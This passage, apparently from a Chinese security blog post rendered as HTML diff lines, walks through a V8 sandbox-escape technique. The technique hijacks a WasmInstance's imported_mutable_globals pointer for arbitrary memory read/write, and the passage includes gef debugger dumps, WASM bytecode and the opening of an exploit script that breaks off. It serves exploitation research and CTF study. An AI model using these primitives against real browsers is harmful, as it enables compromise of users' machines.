0x1b:&apos;) // rcx = jitAddr</span><br><span class="line">print(hex(jitAddr + 0x1b));</span><br><span class="line">print(hex(readOff(jitAddr + 0x1b)));</span><br><span class="line">// %SystemBreak();</span><br><span class="line">// writeOff(fAddr + 0x17, jitAddr + 0xb3 - 0x3f);</span><br><span class="line">writeOff(fAddr + 0x17, jitAddr + 0x7c);</span><br><span class="line">print(readOff(fooAddr + 0x17));</span><br><span class="line">dp(foo);</span><br><span class="line">// %SystemBreak();</span><br><span class="line">f();</span><br></pre></td></tr></table></figure>
+<h2 id="方法二：利用-WasmInstance-的全局变量"><a href="#方法二：利用-WasmInstance-的全局变量" class="headerlink" title="方法二：利用 WasmInstance 的全局变量"></a>方法二：利用 WasmInstance 的全局变量</h2><p><em>（参考：<a href="https://blog.kylebot.net/2022/02/06/DiceCTF-2022-memory-hole/" target="_blank" rel="noopener">https://blog.kylebot.net/2022/02/06/DiceCTF-2022-memory-hole/</a>）</em></p>
+<p>尽管沙箱几乎把所有指针都压缩了，但依然存在一些64位的原始指针，可以尝试劫持它们来绕过沙箱。</p>
+<h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><p>WasmInstance 对象的 <code>imported_mutable_globals</code> 存储 WASM 代码中使用的所有全局变量，它并没有被沙箱保护起来。</p>
+<p>下面是一个 WasmInstance 对象：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: 0x3b17081d2f3d: [WasmInstanceObject] in OldSpace</span><br><span class="line"> - map: 0x3b1708206439 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3b1708046975 &lt;Object map = 0x3b1708206c81&gt;</span><br><span class="line"> - elements: 0x3b1708002249 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - module_object: 0x3b1708048b69 &lt;Module map = 0x3b17082062d1&gt;</span><br><span class="line"> - exports_object: 0x3b1708048e85 &lt;Object map = 0x3b1708206d21&gt;</span><br><span class="line"> - native_context: 0x3b17081c2c75 &lt;NativeContext[266]&gt;</span><br><span class="line"> - imported_mutable_globals_buffers: 0x3b17081d3035 &lt;FixedArray[1]&gt;</span><br><span class="line"> - imported_function_refs: 0x3b1708002249 &lt;FixedArray[0]&gt;</span><br><span class="line"> - indirect_function_table_refs: 0x3b1708002249 &lt;FixedArray[0]&gt;</span><br><span class="line"> - managed_native_allocations: 0x3b1708048e61 &lt;Foreign&gt;</span><br><span class="line"> - managed object maps: 0x3b1708002249 &lt;FixedArray[0]&gt;</span><br><span class="line"> - feedback vectors: 0x3b1708002249 &lt;FixedArray[0]&gt;</span><br><span class="line"> - memory_start: (nil)</span><br><span class="line"> - memory_size: 0</span><br><span class="line"> - imported_function_targets: 0x560e9be53750</span><br><span class="line"> - globals_start: (nil)</span><br><span class="line"> - imported_mutable_globals: 0x560e9be53770</span><br><span class="line"> - ...</span><br></pre></td></tr></table></figure>
+<p>查看内存，<code>imported_mutable_globals</code> 确实还是64位。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/20xg 0x3b17081d2f3d-1</span><br><span class="line">0x3b17081d2f3c:	0x0800224908206439	0x0800224908002249</span><br><span class="line">0x3b17081d2f4c:	0x0000000008002249	0x0000000000000000</span><br><span class="line">0x3b17081d2f5c:	0x0000000000000000	0x0000560e9bddc640</span><br><span class="line">0x3b17081d2f6c:	0x0000560e9be53750	0x0000000000000000</span><br><span class="line">0x3b17081d2f7c:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x3b17081d2f8c:	0x0000560e9be53770	0x0000560e9bddc620</span><br><span class="line">0x3b17081d2f9c:	0x0000246bb5adb000	0x0000560e9bde8a48</span><br><span class="line">0x3b17081d2fac:	0x0000560e9bde8a40	0x0000560e9bde8a60</span><br><span class="line">0x3b17081d2fbc:	0x0000560e9bde8a58	0x0000560e9bddc630</span><br><span class="line">0x3b17081d2fcc:	0x0000560e9be53790	0x0000560e9be537b0</span><br></pre></td></tr></table></figure>
+<h3 id="使用全局变量"><a href="#使用全局变量" class="headerlink" title="使用全局变量"></a>使用全局变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var global = new WebAssembly.Global(&#123;value:&apos;i64&apos;, mutable:true&#125;, 0n);</span><br><span class="line">var wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 12, 3, 96, 0, 1, 126, 96, 0, 0, 96, 1, 126, 0, 2, 14, 1, 2, 106, 115, 6, 103, 108, 111, 98, 97, 108, 3, 126, 1, 3, 4, 3, 0, 1, 2, 7, 37, 3, 9, 103, 101, 116, 71, 108, 111, 98, 97, 108, 0, 0, 9, 105, 110, 99, 71, 108, 111, 98, 97, 108, 0, 1, 9, 115, 101, 116, 71, 108, 111, 98, 97, 108, 0, 2, 10, 23, 3, 4, 0, 35, 0, 11, 9, 0, 35, 0, 66, 1, 124, 36, 0, 11, 6, 0, 32, 0, 36, 0, 11]);</span><br><span class="line">var wasm_mod = new WebAssembly.Module(wasm_code);</span><br><span class="line">var wasm_instance = new WebAssembly.Instance(wasm_mod, &#123;js: &#123;global&#125;&#125;);</span><br></pre></td></tr></table></figure>
+<p>以上可以往 <code>imported_mutable_globals</code> 里添加一个 int64 的全局变量 。</p>
+<p>注意<code>global</code> 这个变量是在当前堆上分配的，利用漏洞是可以修改这个对象的属性。</p>
+<p>DebugPrint 一下这个 <code>global</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: 0xc7908048d0d: [WasmGlobalObject]</span><br><span class="line"> - map: 0x0c7908206821 &lt;Map(HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - untagged_buffer: 0x0c7908048d31 &lt;ArrayBuffer map = 0xc7908203289&gt;</span><br><span class="line"> - offset: 0</span><br><span class="line"> - raw_type: 2</span><br><span class="line"> - is_mutable: 1</span><br><span class="line"> - type: i64</span><br><span class="line"> - is_mutable: 1</span><br></pre></td></tr></table></figure>
+<p><code>untagged_buffer</code> 是一个 ArrayBuffer，<code>backing_store</code> 是 <code>0x3b1800002000</code> ，也就是 <code>global</code> 存储数据的地址。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gef➤  job 0x3b1708048d31</span><br><span class="line">0x3b1708048d31: [JSArrayBuffer]</span><br><span class="line"> - map: 0x3b1708203289 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3b17081c99e9 &lt;Object map = 0x3b17082032b1&gt;</span><br><span class="line"> - elements: 0x3b1708002249 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - embedder fields: 2</span><br><span class="line"> - backing_store: 0x3b1800002000</span><br><span class="line"> - byte_length: 8</span><br><span class="line"> - max_byte_length: 8</span><br><span class="line"> - detachable</span><br><span class="line"> - properties: 0x3b1708002249 &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;&#125;</span><br><span class="line"> - embedder fields = &#123;</span><br><span class="line">    0, aligned pointer: (nil)</span><br><span class="line">    0, aligned pointer: (nil)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>回过头看上面 <code>wasm_instance</code> 的 <code>imported_mutable_globals</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: 0x3b17081d2f3d: [WasmInstanceObject] in OldSpace</span><br><span class="line"> - map: 0x3b1708206439 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3b1708046975 &lt;Object map = 0x3b1708206c81&gt;</span><br><span class="line"> - elements: 0x3b1708002249 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - module_object: 0x3b1708048b69 &lt;Module map = 0x3b17082062d1&gt;</span><br><span class="line"> - exports_object: 0x3b1708048e85 &lt;Object map = 0x3b1708206d21&gt;</span><br><span class="line"> - native_context: 0x3b17081c2c75 &lt;NativeContext[266]&gt;</span><br><span class="line"> - imported_mutable_globals_buffers: 0x3b17081d3035 &lt;FixedArray[1]&gt;</span><br><span class="line"> - imported_function_refs: 0x3b1708002249 &lt;FixedArray[0]&gt;</span><br><span class="line"> - indirect_function_table_refs: 0x3b1708002249 &lt;FixedArray[0]&gt;</span><br><span class="line"> - managed_native_allocations: 0x3b1708048e61 &lt;Foreign&gt;</span><br><span class="line"> - managed object maps: 0x3b1708002249 &lt;FixedArray[0]&gt;</span><br><span class="line"> - feedback vectors: 0x3b1708002249 &lt;FixedArray[0]&gt;</span><br><span class="line"> - memory_start: (nil)</span><br><span class="line"> - memory_size: 0</span><br><span class="line"> - imported_function_targets: 0x560e9be53750</span><br><span class="line"> - globals_start: (nil)</span><br><span class="line"> - imported_mutable_globals: 0x560e9be53770</span><br><span class="line"> - ...</span><br></pre></td></tr></table></figure>
+<p>这里的第一个元素即是 <code>global</code> 的 <code>backing_store</code> 地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/10xg 0x560e9be53770</span><br><span class="line">0x560e9be53770:	0x00003b1800002000	0x00007fcdcb1bdca0</span><br><span class="line">0x560e9be53780:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x560e9be53790:	0x00007fcdcb1bdca0	0x00007fcdcb1bdca0</span><br><span class="line">0x560e9be537a0:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x560e9be537b0:	0x00007fcdcb1bdca0	0x00007fcdcb1bdca0</span><br></pre></td></tr></table></figure>
+<p>我们伪造一个 <code>imported_mutable_globals</code> 替换掉 <code>wasm_instance</code> 的 <code>imported_mutable_globals</code> ，即可做到任意地址读写。</p>
+<h3 id="伪造-imported-mutable-globals"><a href="#伪造-imported-mutable-globals" class="headerlink" title="伪造 imported_mutable_globals"></a>伪造 imported_mutable_globals</h3><p> <code>imported_mutable_globals</code> 并不是一个 JS 对象，不用泄漏 map ，伪造起来比较容易。</p>
+<p>创建一个 <code>array</code> ，第一个元素是要读写的任意地址。</p>
+<p>再泄漏这个 <code>array</code> 的偏移及基址 <code>js_base</code> 计算得到完整的 <code>array</code> 地址，覆盖掉用来的 <code>imported_mutable_globals</code> 。</p>
+<p>泄漏 <code>array</code> 的偏移按常规的路子来就行，泄漏 <code>js_base</code> 见下一节。</p>
+<p>一切搞好后，要读写任意地址，改 <code>array[0]</code> 即可。</p>
+<h3 id="获取基址-js-base"><a href="#获取基址-js-base" class="headerlink" title="获取基址 js_base"></a>获取基址 js_base</h3><p>泄漏基址 <code>js_base</code> 并不难，多次运行 d8 ，搜索下基址：</p>
+<p>第一次</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gef➤  search-pattern 0x1c53</span><br><span class="line">[+] Searching &apos;\x53\x1c&apos; in memory</span><br><span class="line">[+] In (0x1c5300000000-0x1c5300003000), permission=rw-</span><br><span class="line">  0x1c530000001c - 0x1c5300000024  →   &quot;\x53\x1c[...]&quot; </span><br><span class="line">  0x1c5300000024 - 0x1c530000002c  →   &quot;\x53\x1c[...]&quot; </span><br><span class="line">  0x1c5300000054 - 0x1c530000005c  →   &quot;\x53\x1c[...]&quot; </span><br><span class="line">  0x1c53000000f4 - 0x1c53000000fc  →   &quot;\x53\x1c[...]&quot;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>第二次</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gef➤  search-pattern 0x00002c3b</span><br><span class="line">[+] Searching &apos;\x3b\x2c\x00\x00&apos; in memory</span><br><span class="line">[+] In (0x2c3b00000000-0x2c3b00003000), permission=rw-</span><br><span class="line">  0x2c3b0000001c - 0x2c3b0000001e  →   &quot;;,&quot; </span><br><span class="line">  0x2c3b00000024 - 0x2c3b00000026  →   &quot;;,&quot; </span><br><span class="line">  0x2c3b00000054 - 0x2c3b00000056  →   &quot;;,&quot; </span><br><span class="line">  0x2c3b000000f4 - 0x2c3b000000f6  →   &quot;;,&quot;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>第三次</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gef➤  search-pattern 0x3f13</span><br><span class="line">[+] Searching &apos;\x13\x3f&apos; in memory</span><br><span class="line">[+] In (0x3f1300000000-0x3f1300003000), permission=rw-</span><br><span class="line">  0x3f130000001c - 0x3f1300000024  →   &quot;\x13\x3f[...]&quot; </span><br><span class="line">  0x3f1300000024 - 0x3f130000002c  →   &quot;\x13\x3f[...]&quot; </span><br><span class="line">  0x3f1300000054 - 0x3f130000005c  →   &quot;\x13\x3f[...]&quot; </span><br><span class="line">  0x3f13000000f4 - 0x3f13000000fc  →   &quot;\x13\x3f[...]&quot;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>可以看到，在 <code>[js_base , js_base+0x3000]</code> 的区间就有一些64位的原始指针，如果能读到，就可以泄漏出基址。</p>
+<p>具体的方法，构造一个 <code>BigInt64Array</code> 修改 <code>external_pointer</code> ，以及 <code>byte_length</code> ，让 <code>BigInt64Array</code> 能从 <code>js_base</code> 开始访问。</p>
+<p>这里由于沙箱，<code>data_ptr</code> 的计算方式改为 <code>js_base + base_pointer + (external_pointer &lt;&lt; 2)</code>  ，需要注意 <code>external_pointer</code> 变为了偏移，如下图的 <code>0x1000000</code> 。 </p>
+<p><img src="/2022/02/27/v8-sandbox-escape/Untitled%2013.png" alt="Untitled"></p>
+<p>修改 <code>external_pointer</code> 和 <code>base_pointer</code> 为 <code>0</code> ，<code>BigIng64Array</code> 就会从 <code>js_base</code> 开始访问了。</p>
+<h3 id="修改全局变量"><a href="#修改全局变量" class="headerlink" title="修改全局变量"></a>修改全局变量</h3><p>参考 mdm 提供的 demo <a href="https://github.com/mdn/webassembly-examples/blob/master/js-api-examples/global.wat" target="_blank" rel="noopener">https://github.com/mdn/webassembly-examples/blob/master/js-api-examples/global.wat</a> ，添加修改 global 变量的函数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(module</span><br><span class="line">   (global $g (import &quot;js&quot; &quot;global&quot;) (mut i64))</span><br><span class="line">   (func (export &quot;getGlobal&quot;) (result i64)</span><br><span class="line">        (global.get $g))</span><br><span class="line">   (func (export &quot;setGlobal&quot;) (param i64)</span><br><span class="line">        (global.set $g</span><br><span class="line">            (get_local 0)))</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<p>用 wat2wasm <a href="https://webassembly.github.io/wabt/demo/wat2wasm/" target="_blank" rel="noopener">https://webassembly.github.io/wabt/demo/wat2wasm/</a> 编译后，提取二进制格式的输出。</p>
+<p>现在可以使用 WASM 修改全局变量了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var wasm_code = new Uint8Array([0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,0x01,0x09,0x02,0x60,0x00,0x01,0x7e,0x60,0x01,0x7e,0x00,0x02,0x0e,0x01,0x02,0x6a,0x73,0x06,0x67,0x6c,0x6f,0x62,0x61,0x6c,0x03,0x7e,0x01,0x03,0x03,0x02,0x00,0x01,0x07,0x19,0x02,0x09,0x67,0x65,0x74,0x47,0x6c,0x6f,0x62,0x61,0x6c,0x00,0x00,0x09,0x73,0x65,0x74,0x47,0x6c,0x6f,0x62,0x61,0x6c,0x00,0x01,0x0a,0x0d,0x02,0x04,0x00,0x23,0x00,0x0b,0x06,0x00,0x20,0x00,0x24,0x00,0x0b,0x00,0x14,0x04,0x6e,0x61,0x6d,0x65,0x02,0x07,0x02,0x00,0x00,0x01,0x01,0x00,0x00,0x07,0x04,0x01,0x00,0x01,0x67])</span><br><span class="line">var wasm_mod = new WebAssembly.Module(wasm_code); </span><br><span class="line"></span><br><span class="line">const global = new WebAssembly.Global(&#123;value:&apos;i64&apos;, mutable:true&#125;, 0n);</span><br><span class="line">var wasm_instance = new WebAssembly.Instance(wasm_mod, &#123;js:&#123;global&#125;&#125;); </span><br><span class="line"></span><br><span class="line">var getGlobal= wasm_instance.exports.getGlobal;</span><br><span class="line">var setGlobal= wasm_instance.exports.setGlobal;</span><br><span class="line"></span><br><span class="line">setGlobal(0x10000n);</span><br><span class="line">console.log(getGlobal()); // 65535</span><br></pre></td></tr></table></figure>
+<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dp</span>(<span class="params">x</span>) </span>&#123;&#125; </span><br><span class="line"><span class="comment">// function dp(x) &#123;%DebugPrint(x);&#125; // const print = console.log;</span></span><br><span class="line"><span class="keyword">const</span> print = <span class="function">(<span class="params">x</span>) =&gt;</span>&#123;<span class="built_in">console</span>.log(x)&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Helpers</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">      <span class="keyword">this</span>.cvt_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">      <span class="keyword">this</span>.cvt_f64a = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="keyword">this</span>.cvt_buf);</span><br><span class="line">      <span class="keyword">this</span>.cvt_u64a = <span class="keyword">new</span> BigUint64Array(<span class="keyword">this</span>.cvt_buf);</span><br><span class="line">      <span class="keyword">this</span>.cvt_u32a = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="keyword">this</span>.cvt_buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ftoi(f) &#123;</span><br><span class="line">      <span class="keyword">this</span>.cvt_f64a[<span class="number">0</span>] = f;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.cvt_u64a[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    itof(i) &#123;</span><br><span class="line">      <span class="keyword">this</span>.cvt_u64a[<span class="number">0</span>] = i;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.cvt_f64a[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ftoil(f) &#123;</span><br><span class="line">      <span class="keyword">this</span>.cvt_f64a[<span class="number">0</span>] = f;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.cvt_u32a[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ftoih(f) &#123;</span><br><span class="line">      <span class="keyword">this</span>.cvt_f64a[<span class="number">0</span>] = f;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.cvt_u32a[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fsetil(f, l) &#123;</span><br><span class="line">      <span class="keyword">this</span>.cvt_f64a[<span class="number">0</span>] = f;</span><br><span class="line">      <span class="keyword">this</span>.cvt_u32a[<span class="number">0</span>] = l;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.cvt_f64a[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fsetih(f, h) &#123;</span><br><span class="line">      <span class="keyword">this</span>.cvt_f64a[<span class="number">0</span>] = f;</span><br><span class="line">      <span class="keyword">this</span>.cvt_u32a[<span class="number">1</span>] = h;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.cvt_f64a[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    isetltof(i, l) &#123;</span><br><span class="line">      <span class="keyword">this</span>.cvt_u64a[<span class="number">0</span>] = i;</span><br><span class="line">      <span class="keyword">this</span>.cvt_u32a[<span class="number">0</span>] = l;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.cvt_f64a[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    isethtof(i, h) &#123;</span><br><span class="line">      <span class="keyword">this</span>.cvt_u64a[<span class="number">0</span>] = i;</span><br><span class="line">      <span class="keyword">this</span>.cvt_u32a[<span class="number">1</span>] = h;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.cvt_f64a[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    isetlhtof(l,h)&#123;</span><br><span class="line">        <span class="keyword">this</span>.cvt_u32a[<span class="number">0</span>] = l;</span><br><span class="line">        <span class="keyword">this</span>.cvt_u32a[<span class="number">1</span>] = h;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.cvt_f64a[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    isetltoi(i,l)&#123;</span><br><span class="line">      <span class="keyword">this</span>.cvt_u32a[<span class="number">0</span>] = l;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.cvt_u64a[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    isethtoi(i,h)&#123;</span><br><span class="line">      <span class="keyword">this</span>.cvt_u32a[<span class="number">1</span>] = h;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.cvt_u64a[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    isetlhtoi(l,h)&#123;</span><br><span class="line">        <span class="keyword">this</span>.cvt_u32a[<span class="number">0</span>] = l;</span><br><span class="line">        <span class="keyword">this</span>.cvt_u32a[<span class="number">1</span>] = h;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.cvt_u64a[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    igetl(i) &#123;</span><br><span class="line">      <span class="keyword">this</span>.cvt_u64a[<span class="number">0</span>] = i;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.cvt_u32a[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    igeth(i) &#123;</span><br><span 